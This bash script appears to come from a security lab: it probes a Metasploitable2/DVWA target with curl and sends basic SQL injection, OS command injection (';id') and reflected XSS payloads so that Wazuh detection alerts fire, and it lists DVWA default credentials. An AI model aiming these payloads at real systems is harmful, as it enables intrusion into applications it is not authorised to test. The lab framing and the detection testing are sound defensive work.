#!/bin/bash
# Web Application Attack - MITRE ATT&CK T1190
# Tests web vulnerabilities on Metasploitable2

echo "=========================================="
echo "Web Application Attack (T1190)"
echo "=========================================="
echo ""

# Get Metasploitable IP
TARGET=$(getent hosts metasploitable | awk '{ print $1 }')
if [ -z "$TARGET" ]; then
    echo "❌ Error: Cannot resolve 'metasploitable' hostname"
    echo "Falling back to common Docker subnet..."
    TARGET="172.20.0.100"
fi

echo "🎯 Target: http://$TARGET:80"
echo "📋 Attack Type: Web Application Exploitation"
echo "🔧 Tools: curl, manual probing"
echo ""

echo "🚀 Phase 1: Web Server Reconnaissance"
echo "Checking HTTP headers..."
curl -I http://$TARGET:80 2>/dev/null || echo "Connection failed"
echo ""

echo "🚀 Phase 2: Directory Enumeration"
echo "Testing common paths..."
for path in "/" "/phpMyAdmin/" "/dvwa/" "/mutillidae/" "/tikiwiki/"; do
    status=$(curl -s -o /dev/null -w "%{http_code}" http://$TARGET:80$path)
    echo "  $path - HTTP $status"
done
echo ""

echo "🚀 Phase 3: SQL Injection Test (Basic)"
echo "Testing vulnerable parameter..."
curl -s "http://$TARGET:80/dvwa/vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit" | grep -o "Surname.*</pre>" | head -1
echo ""

echo "🚀 Phase 4: Command Injection Test"
echo "Testing for OS command injection..."
curl -s "http://$TARGET:80/dvwa/vulnerabilities/exec/?ip=127.0.0.1;id&Submit=Submit" | grep -o "uid=.*" | head -1
echo ""

echo "🚀 Phase 5: Cross-Site Scripting (XSS) Test"
echo "Testing XSS vulnerability..."
curl -s "http://$TARGET:80/dvwa/vulnerabilities/xss_r/?name=<script>alert('XSS')</script>" > /dev/null
echo "XSS payload sent"
echo ""

echo "✅ Web application testing completed!"
echo ""
echo "📊 Expected Wazuh Alerts:"
echo "  - Web application attack attempts"
echo "  - SQL injection patterns detected"
echo "  - Command injection detected"
echo "  - Multiple suspicious HTTP requests"
echo "  - MITRE Technique: T1190 - Exploit Public-Facing Application"
echo ""
echo "🔍 Vulnerable Applications Found:"
echo "  - DVWA (Damn Vulnerable Web Application)"
echo "  - phpMyAdmin (Database management)"
echo "  - Mutillidae (OWASP training app)"
echo "  - TWiki (Vulnerable wiki software)"
echo ""
echo "🔍 Check Wazuh Dashboard: https://localhost:443"
echo "   Navigate to: Security Events → Web Attacks"
echo ""
echo "💡 Manual Testing:"
echo "   Open browser: http://localhost:8080/dvwa/"
echo "   Default credentials: admin/password"
echo "   Set security level to 'low' for testing"
